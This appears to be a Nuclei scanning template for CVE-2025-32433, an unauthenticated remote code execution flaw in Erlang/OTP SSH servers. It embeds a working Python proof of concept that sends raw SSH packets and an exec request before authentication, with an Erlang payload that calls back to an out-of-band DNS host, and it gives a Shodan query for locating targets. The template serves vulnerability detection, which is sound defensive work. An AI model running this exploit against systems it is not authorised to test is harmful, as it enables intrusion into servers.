code:
- engine:
  - py
  - python3
  matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol, "dns")
    type: dsl
  source: "import socket,os\nimport struct\nimport time\nimport binascii\n\nHOST =\
    \ os.getenv('Host')\nPORT = os.getenv('Port')\n\ndef hexdump(data):\n    return\
    \ ' '.join([f'{b:02x}' for b in data])\n\ndef string_payload(s):\n    s_bytes\
    \ = s.encode(\"utf-8\")\n    return struct.pack(\">I\", len(s_bytes)) + s_bytes\n\
    \ndef build_packet(payload):\n    padding_length = 8 - ((len(payload) + 5) % 8)\n\
    \    if padding_length < 4:\n        padding_length += 8\n    packet_length =\
    \ len(payload) + padding_length + 1\n    packet = (\n        struct.pack(\">I\"\
    , packet_length) +\n        bytes([padding_length]) +\n        payload +\n   \
    \     b\"\\x00\" * padding_length\n    )\n    return packet\n\ndef build_channel_open(channel_id=0):\n\
    \    return build_packet(\n        b\"\\x5a\" +\n        string_payload(\"session\"\
    ) +\n        struct.pack(\">I\", channel_id) +\n        struct.pack(\">I\", 0x100000)\
    \ +\n        struct.pack(\">I\", 0x8000) +\n        b\"\"\n    )\n\ndef build_channel_request(channel_id=0,\
    \ command=\"\"):\n    return build_packet(\n        b\"\\x62\" +\n        struct.pack(\"\
    >I\", channel_id) +\n        string_payload(\"exec\") +\n        b\"\\x01\" +\n\
    \        string_payload(command)\n    )\n\ndef build_kexinit():\n    cookie =\
    \ b\"\\x00\" * 16\n    kex_algorithms = [\"curve25519-sha256@libssh.org\", \"\
    diffie-hellman-group14-sha1\"]\n    host_key_algorithms = [\"ssh-rsa\",\"rsa-sha2-512\"\
    ,\"rsa-sha2-256\"]\n    ciphers = [\"aes128-ctr\"]\n    macs = [\"hmac-sha1\"\
    ]\n    compression = [\"none\"]\n\n    payload = (\n        b\"\\x14\" +\n   \
    \     cookie +\n        string_payload(\",\".join(kex_algorithms)) +\n       \
    \ string_payload(\",\".join(host_key_algorithms)) +\n        string_payload(\"\
    ,\".join(ciphers)) +\n        string_payload(\",\".join(ciphers)) +\n        string_payload(\"\
    ,\".join(macs)) +\n        string_payload(\",\".join(macs)) +\n        string_payload(\"\
    ,\".join(compression)) +\n        string_payload(\",\".join(compression)) +\n\
    \        string_payload(\"\") +\n        string_payload(\"\") +\n        b\"\\\
    x00\" +\n        struct.pack(\">I\", 0)\n    )\n    return build_packet(payload)\n\
    \ndef receive_packet(sock, timeout=5):\n    sock.settimeout(timeout)\n    try:\n\
    \        size_data = sock.recv(4)\n        if not size_data:\n            return\
    \ None\n        packet_size = struct.unpack(\">I\", size_data)[0]\n        packet\
    \ = sock.recv(packet_size)\n        return packet\n    except socket.timeout:\n\
    \        print(\"[!] Timeout waiting for response\")\n        return None\n  \
    \  except Exception as e:\n        print(f\"[!] Error receiving packet: {e}\"\
    )\n        return None\n\ntry:\n    with socket.create_connection((HOST, PORT))\
    \ as s:\n        print(\"[*] Connecting to SSH server...\")\n\n        # Send\
    \ initial SSH version with specific version string\n        version = b\"SSH-2.0-OpenSSH_7.4\\\
    r\\n\"\n        s.sendall(version)\n\n        banner = s.recv(1024)\n        #print(f\"\
    [+] Received banner: {banner.strip().decode(errors='ignore')}\")\n\n        #print(\"\
    [*] Sending KEXINIT...\")\n        s.sendall(build_kexinit())\n        response\
    \ = receive_packet(s)\n        if response:\n            print(\"[+] Received\
    \ KEXINIT response\")\n\n        print(\"[*] Sending channel_open...\")\n    \
    \    s.sendall(build_channel_open())\n        response = receive_packet(s)\n \
    \       if response:\n            print(\"[+] Channel opened successfully\")\n\
    \            msg_type = response[1] if len(response) > 1 else None\n        time.sleep(1)\n\
    \        # Try different payload formats\n        payloads = [\n            'inet:gethostbyname(\"\
    ' + os.getenv('OAST') + '\").'\n\n\n        ]\n        for payload in payloads:\n\
    \            print(f\"[*] Trying payload: {payload}\")\n            s.sendall(build_channel_request(command=payload))\n\
    \            response = receive_packet(s)\n            if response:\n        \
    \        print(f\"[+] Response received for payload: {payload}\")\n          \
    \  time.sleep(1)\n        print(\"[*] Exploit attempt completed\")\n\nexcept Exception\
    \ as e:\n    print(f\"[!] Error during exploitation: {e}\")\n"
id: CVE-2025-32433
info:
  author: iamnoooob,rootxharsh,pdresearch,darses
  classification:
    cve-id: CVE-2025-32433
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-306
    epss-percentile: 0.9717
    epss-score: 0.39914
  description: 'Erlang/OTP is a set of libraries for the Erlang programming language.
    Prior to versions OTP-27.3.3, OTP-26.2.5.11, and OTP-25.3.2.20, a SSH server may
    allow an attacker to perform unauthenticated remote code execution (RCE). By exploiting
    a flaw in SSH protocol message handling, a malicious actor could gain unauthorized
    access to affected systems and execute arbitrary commands without valid credentials.

    '
  impact: 'Unauthenticated attackers can execute arbitrary code or commands through
    specially crafted SSH protocol requests to the fgfmd daemon on Erlang/OTP SSH
    servers.

    '
  metadata:
    max-request: 1
    shodan-query: Erlang OTP
    verified: true
  name: Erlang/OTP SSH - Remote Code Execution
  reference:
  - https://platformsecurity.com/blog/CVE-2025-32433-poc
  - https://github.com/erlang/otp/commit/0fcd9c56524b28615e8ece65fc0c3f66ef6e4c12
  - https://github.com/erlang/otp/commit/6eef04130afc8b0ccb63c9a0d8650209cf54892f
  - https://github.com/erlang/otp/commit/b1924d37fd83c070055beb115d5d6a6a9490b891
  - https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2
  - https://nvd.nist.gov/vuln/detail/CVE-2025-32433
  remediation: 'This issue is patched in versions OTP-27.3.3, OTP-26.2.5.11, and OTP-25.3.2.20.
    A temporary workaround involves disabling the SSH server or to prevent access
    via firewall rules.

    '
  severity: critical
  tags: cve,cve2025,erlang,otp,ssh,rce,oast,kev,vkev,vuln
variables:
  OAST: '{{interactsh-url}}'
